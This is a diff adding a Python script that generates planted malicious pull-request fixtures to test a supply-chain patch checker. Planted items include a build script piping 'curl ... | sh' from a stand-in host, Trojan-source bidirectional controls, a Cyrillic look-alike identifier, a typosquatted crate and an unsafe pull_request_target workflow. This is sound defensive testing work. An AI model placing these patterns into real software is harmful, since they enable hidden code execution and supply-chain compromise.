@@ -1,0 +1,275 @@
+#!/usr/bin/env python3
+"""Make the fixtures: one planted pull request per patch check, and real past
+changes that must pass, each as git format-patch output against a pinned
+commit of an open repository.
+
+Usage:
+    make-fixtures SCRATCH
+
+Clones NoWayOS, the Showcase and Screen Compiler from the folders beside this
+repository into SCRATCH (empty, and outside every git work tree), makes each
+change there as a placeholder contributor on fixed dates, and writes
+fixtures/NAME.patch and fixtures/fixtures.toml. Each fixture's base is the
+main branch of the clone it was made from; the real changes are named by
+commit, so they are picked again when those repositories' history moves on.
+It never changes a maintainer's clone, and nothing it plants is ever built
+or run: the fixtures are text for tools/check-patch.
+Python 3.11 or later, standard library only.
+"""
+import os
+import random
+import subprocess
+import sys
+
+ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+WS = os.path.dirname(ROOT)
+OUT = os.path.join(ROOT, "fixtures")
+if len(sys.argv) != 2:
+    sys.exit(__doc__.strip())
+SCRATCH = os.path.abspath(sys.argv[1])
+NAME, EMAIL = "A Contributor", "contributor@example.invalid"
+SIGN = f"\n\nSigned-off-by: {NAME} <{EMAIL}>"
+ENV = dict(os.environ, GIT_AUTHOR_NAME=NAME, GIT_AUTHOR_EMAIL=EMAIL, GIT_COMMITTER_NAME=NAME,
+           GIT_COMMITTER_EMAIL=EMAIL, GIT_AUTHOR_DATE="2026-11-01T12:00:00+0000",
+           GIT_COMMITTER_DATE="2026-11-01T12:00:00+0000")
+BASES = {}
+ENTRIES = []
+
+
+def git(repo, *args, out=False):
+    result = subprocess.run(["git", "-C", repo, *args], env=ENV, capture_output=True, check=True)
+    return result.stdout if out else None
+
+
+def clone(name):
+    path = os.path.join(SCRATCH, name)
+    if not os.path.isdir(path):
+        subprocess.run(["git", "clone", "-q", os.path.join(WS, name), path], check=True)
+    BASES[name] = git(path, "rev-parse", "origin/main", out=True).decode().strip()
+    return path
+
+
+def edit(repo, rel, change):
+    path = os.path.join(repo, rel)
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    old = open(path, encoding="utf-8").read() if os.path.exists(path) else ""
+    new = change(old)
+    assert new != old, rel
+    open(path, "w", encoding="utf-8").write(new)
+
+
+def replace_once(a, b):
+    def change(text):
+        assert text.count(a) == 1, a
+        return text.replace(a, b)
+    return change
+
+
+def fixture(name, repo_name, message, edits, expect, threat, what, base=None, signed=True):
+    repo = os.path.join(SCRATCH, repo_name)
+    base = base or BASES[repo_name]
+    git(repo, "checkout", "-q", "-f", "-B", "fixture", base)
+    git(repo, "clean", "-qfdx")
+    edits(repo)
+    git(repo, "add", "-A")
+    git(repo, "commit", "-q", "-m", message + (SIGN if signed else ""))
+    patch = git(repo, "format-patch", "--stdout", f"{base}..HEAD", out=True)
+    with open(os.path.join(OUT, f"{name}.patch"), "wb") as handle:
+        handle.write(patch)
+    ENTRIES.append((name, repo_name, base, threat, what, expect))
+
+
+HEADER = """\
+# The fixtures, made by tools/make-fixtures: for each, its patch, the open
+# repository it is for and the commit it was made against, the threat it
+# plants (THREATS.md; "-" for a real change), what it does, and what
+# tools/check-patch must find: each gate that does not pass, "fail" or
+# "maintainer". A real past change expects nothing: it passes every gate.
+# make test (tools/test_check_patch.py) checks every one.
+
+"""
+
+
+def toml_string(text):
+    return '"' + text.replace("\\", "\\\\").replace('"', '\\"') + '"'
+
+
+def main():
+    os.makedirs(SCRATCH, exist_ok=True)
+    if os.listdir(SCRATCH):
+        sys.exit(f"error: {SCRATCH} is not empty")
+    inside = subprocess.run(["git", "-C", SCRATCH, "rev-parse", "--is-inside-work-tree"], capture_output=True)
+    if inside.returncode == 0:
+        sys.exit(f"error: {SCRATCH} is inside a git work tree: make fixtures only in scratch clones of their own")
+    os.makedirs(OUT, exist_ok=True)
+    for name in ("nowayos", "showcase", "screen-compiler"):
+        clone(name)
+
+    # --- planted, NoWayOS ---------------------------------------------------
+    fixture("p1-not-signed-off", "nowayos", "Say what the bounded crate is for in one line",
+            lambda r: edit(r, "crates/nowayos-bounded/src/lib.rs",
+                           lambda t: t + "\n// Bounded storage: fixed capacity, no allocation.\n"),
+            {"P1": "fail"}, "TH8", "A commit with no Signed-off-by line for its author.", signed=False)
+    fixture("p2-gitattributes", "nowayos", "Mark crate sources as generated",
+            lambda r: edit(r, ".gitattributes", lambda t: t + "\ncrates/** -diff linguist-generated\n"),
+            {"P2": "maintainer"}, "TH2, TH4",
+            "Hides every crate's changes from a reviewer's diff: a gate-owned file.")
+
+    def git_dependency(r):
+        edit(r, "crates/nowayos-ui/Cargo.toml", replace_once(
+            "nowayos-input.workspace = true\n",
+            'nowayos-input.workspace = true\ntiny-layout = { git = "https://git.example.invalid/tiny-layout.git", rev = "4f2a9c1" }\n'))
+        edit(r, "Cargo.lock", replace_once(
+            '[[package]]\nname = "nowayos-update"',
+            '[[package]]\nname = "tiny-layout"\nversion = "0.1.0"\n'
+            'source = "git+https://git.example.invalid/tiny-layout.git?rev=4f2a9c1#4f2a9c1e0b7d3a5f6c8e9d0a1b2c3d4e5f6a7b8c"\n\n'
+            '[[package]]\nname = "nowayos-update"'))
+    fixture("p3-git-dependency", "nowayos", "Use tiny-layout for the UI's flex rows", git_dependency,
+            {"P2": "maintainer", "P3": "fail"}, "TH3",
+            "A git dependency at a commit NoWayOS does not pin.")
+    fixture("p4-build-script", "nowayos", "Generate the UI's colour table at build time",
+            lambda r: edit(r, "crates/nowayos-ui/build.rs", lambda t: (
+                "// SPDX-License-Identifier: MIT OR Apache-2.0\n"
+                "fn main() {\n"
+                "    let _ = std::process::Command::new(\"sh\")\n"
+                "        .args([\"-c\", \"curl -s https://example.invalid/colours | sh\"])\n"
+                "        .status();\n"
+                "}\n")),
+            {"P4": "maintainer"}, "TH1", "A build script: code that runs when the crate is built.")
+    fixture("p5-trojan-source", "nowayos", "Note who may skip the idle timeout",
+            lambda r: edit(r, "crates/nowayos-bounded/src/lib.rs", lambda t: t + (
+                "\n/* Only maintenance mode skips the check ‮ } ⁦if maintenance⁩ ⁦ { */\n")),
+            {"P5": "fail"}, "TH4",
+            "Bidirectional controls in a comment, so the code reads differently from how it compiles.")
+    fixture("p6-binary-file", "nowayos", "Add the UI's precomputed colour table",
+            lambda r: open(os.path.join(r, "crates/nowayos-ui/src/colours.bin"), "wb").write(
+                b"\0" + random.Random(7).randbytes(511)),
+            {"P6": "fail"}, "TH4", "A binary file outside the folders OWNERS.md lists.")
+    fixture("p6-binary-as-text", "nowayos", "Add the UI's precomputed gamma table",
+            lambda r: open(os.path.join(r, "crates/nowayos-ui/src/gamma.tbl"), "wb").write(
+                bytes(0x80 | byte for byte in random.Random(7).randbytes(512))),
+            {"P5": "fail", "P6": "fail"}, "TH4",
+            "Bytes that are not text, in a file git diffs as text because it holds no NUL byte.")
+
+    def test_removed(r):
+        def change(text):
+            start = text.index("    #[test]\n    fn a_frame_with_no_pixels_is_not_encoded()")
+            end = text.index("    /// The PNG chunk checksum")
+            return text[:start] + text[end:]
+        edit(r, "crates/nowayos-testkit/src/image.rs", change)
+    fixture("p7-test-removed", "nowayos", "Tidy the image tests", test_removed,
+            {"P7": "maintainer"}, "TH2", "A test removed inside a tidy-up.")
+    fixture("p8-lint-allowed", "nowayos", "Let the testkit index its pixels directly",
+            lambda r: edit(r, "crates/nowayos-testkit/src/image.rs", replace_once(
+                "    pub fn from_png(bytes: &[u8]) -> Result<Self, PngError> {",
+                "    #[allow(clippy::indexing_slicing, reason = \"the size is checked above\")]\n"
+                "    pub fn from_png(bytes: &[u8]) -> Result<Self, PngError> {")),
+            {"P8": "maintainer"}, "TH2", "A lint the baseline denies, allowed.")
+    fixture("p8-forbidden-line-removed", "nowayos", "Quieten hello's expect file",
+            lambda r: edit(r, "systems/hello.expect", replace_once("!panicked\n", "")),
+            {"P2": "maintainer", "P8": "maintainer"}, "TH2",
+            "A forbidden line removed, so a panic would no longer fail the test.")
+    fixture("p8-unsafe-allowed", "nowayos", "Allow unsafe in the input crate for speed",
+            lambda r: edit(r, "tools/unsafe-allowlist.toml", lambda t: t + (
+                '\n[[crate]]\nname = "nowayos-input"\nreason = "faster decoding"\n')),
+            {"P2": "maintainer", "P8": "maintainer"}, "TH2", "An entry added to the approved-unsafe list.")
+    fixture("p9-toolchain-moved", "nowayos", "Move to the newer stable toolchain",
+            lambda r: edit(r, "rust-toolchain.toml", replace_once('channel = "1.93.1"', 'channel = "1.94.0"')),
+            {"P2": "maintainer", "P9": "maintainer"}, "TH10", "The pinned toolchain moved.")
+    fixture("p10-workflow-added", "nowayos", "Publish nightly builds",
+            lambda r: edit(r, ".github/workflows/nightly.yml", lambda t: (
+                "name: nightly\non:\n  pull_request_target:\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
+                "    steps:\n      - uses: actions/checkout@v4\n        with:\n"
+                "          ref: ${{ github.event.pull_request.head.sha }}\n      - run: make ci\n")),
+            {"P2": "maintainer", "P10": "maintainer"}, "TH10",
+            "A workflow that would run a pull request's own code with the repository's secrets.")
+
+    # --- planted, Showcase --------------------------------------------------
+    def new_crate(r):
+        edit(r, "showcase/showcase-app/Cargo.toml", replace_once(
+            "[dev-dependencies]\n", "serde_jsn = \"1.0\"\n\n[dev-dependencies]\n"))
+        edit(r, "Cargo.lock", replace_once(
+            '[[package]]\nname = "showcase-app"',
+            '[[package]]\nname = "serde_jsn"\nversion = "1.0.3"\n'
+            'source = "registry+https://github.com/rust-lang/crates.io-index"\n'
+            'checksum = "0000000000000000000000000000000000000000000000000000000000000000"\n\n'
+            '[[package]]\nname = "showcase-app"'))
+    fixture("p3-new-crate", "showcase", "Read brand settings as JSON", new_crate,
+            {"P2": "maintainer", "P3": "maintainer"}, "TH3",
+            "A new crate whose name imitates a better-known one.")
+    fixture("p5-look-alike-identifier", "showcase", "Check a brand's colours before use",
+            lambda r: edit(r, "showcase/showcase-app/src/brands.rs", lambda t: t + (
+                "\n/// True when every colour of the brand is opaque.\n"
+                "pub fn vаlidate() -> bool {\n    true\n}\n")),
+            {"P5": "fail"}, "TH4", "An identifier with a Cyrillic letter that looks like a Latin one.")
+    fixture("p7-test-ignored", "showcase", "Skip the slow preview test",
+            lambda r: edit(r, "showcase/showcase-app/tests/preview.rs", lambda t: (
+                t[:t.index("#[test]\n")] + "#[test]\n#[ignore]\n" + t[t.index("#[test]\n") + len("#[test]\n"):])),
+            {"P7": "maintainer"}, "TH2", "A test switched off.")
+
+    def grant_added(r):
+        edit(r, "systems/showcase.grants", replace_once(
+            "map ui display_control rw\n", "map ui display_control rw\nmap app display_messages rw\n"))
+    fixture("p8-grant-added", "showcase", "Let the kiosk reach the network directly", grant_added,
+            {"P2": "maintainer", "P8": "maintainer"}, "TH2", "A grant added to a system.")
+    fixture("p9-nowayos-rev-unknown", "showcase", "Build against the faster NoWayOS",
+            lambda r: edit(r, "nowayos.rev", lambda t: "0123456789abcdef0123456789abcdef01234567\n"),
+            {"P2": "maintainer", "P9": "fail"}, "TH10", "nowayos.rev moved to a commit not on NoWayOS's main.")
+
+    # --- planted, Screen Compiler -------------------------------------------
+    def proc_macro(r):
+        edit(r, "crates/screen-compiler-derive/Cargo.toml", lambda t: (
+            '[package]\nname = "screen-compiler-derive"\nversion.workspace = true\nedition.workspace = true\n'
+            'license.workspace = true\npublish = false\n\n[lib]\nproc-macro = true\n\n[lints]\nworkspace = true\n'))
+        edit(r, "crates/screen-compiler-derive/src/lib.rs", lambda t: (
+            "// SPDX-License-Identifier: MIT\n//! Derives screen metadata.\n\n"
+            "use proc_macro::TokenStream;\n\n/// Derives nothing yet.\n#[proc_macro_derive(Screen)]\n"
+            "pub fn derive_screen(_input: TokenStream) -> TokenStream {\n    TokenStream::new()\n}\n"))
+    fixture("p4-procedural-macro", "screen-compiler", "Derive screen metadata", proc_macro,
+            {"P4": "maintainer"}, "TH1", "A procedural macro crate: code the compiler runs.")
+
+    def image_changed(r):
+        path = os.path.join(r, "contract-check/golden/welcome/welcome_screen.png")
+        data = bytearray(open(path, "rb").read())
+        data[-40] ^= 0x01
+        open(path, "wb").write(bytes(data))
+    fixture("p6-approved-image-changed", "screen-compiler", "Redraw the welcome screen", image_changed,
+            {"P2": "maintainer", "P6": "maintainer"}, "TH2, TH4",
+            "An approved image changed: allowed where OWNERS.md lists, but a person looks.")
+
+    # --- real past changes ---------------------------------------------------
+    def real(name, repo_name, commit, paths, message, what):
+        repo = os.path.join(SCRATCH, repo_name)
+        parent = git(repo, "rev-parse", f"{commit}^", out=True).decode().strip()
+
+        def edits(r):
+            git(r, "checkout", commit, "--", *paths)
+        fixture(name, repo_name, message, edits, {}, "-", what, base=parent)
+    real("real-nowayos-tests", "nowayos", "5756cb24082e80356eb760095b2a7e721bf20550",
+         ["crates/nowayos-render-eg/tests/icons.rs", "crates/nowayos-render-eg/tests/progress.rs",
+          "crates/nowayos-render-eg/tests/render.rs", "crates/nowayos-render-eg/tests/wrapping.rs",
+          "crates/nowayos-demo/examples/session.rs", "crates/nowayos-demo/tests/frame_hash.rs"],
+         "Read the approved images as PNG in the renderer's and the demo's tests",
+         "Real: the tests' side of the move to PNG approved images.")
+    real("real-showcase-preview", "showcase", "56091f321547c195464c3f500a6434a09fe74724",
+         ["showcase/showcase-app/tests/preview.rs"],
+         "Write the preview images as PNG", "Real: the preview test writing PNG.")
+    real("real-screen-compiler-readme", "screen-compiler", "e26bb648eab5430bb8fa1c056821a5b2aeb4f841", ["README.md"],
+         "Try it in a folder of its own, and say how long the image takes to build",
+         "Real: the README's Try it steps.")
+
+    with open(os.path.join(OUT, "fixtures.toml"), "w", encoding="utf-8") as handle:
+        handle.write(HEADER)
+        for name, repo_name, base, threat, what, expect in ENTRIES:
+            handle.write("[[fixture]]\n")
+            handle.write(f"patch = {toml_string(name + '.patch')}\n")
+            handle.write(f"repo = {toml_string(repo_name)}\n")
+            handle.write(f"base = {toml_string(base)}\n")
+            handle.write(f"threat = {toml_string(threat)}\n")
+            handle.write(f"what = {toml_string(what)}\n")
+            inner = ", ".join(f"{gate} = {toml_string(result)}" for gate, result in expect.items())
+            handle.write(f"expect = {{ {inner} }}\n\n")
+    print(f"make-fixtures: {len(ENTRIES)} fixtures in {OUT}; bases {BASES}")
+
+
+main()
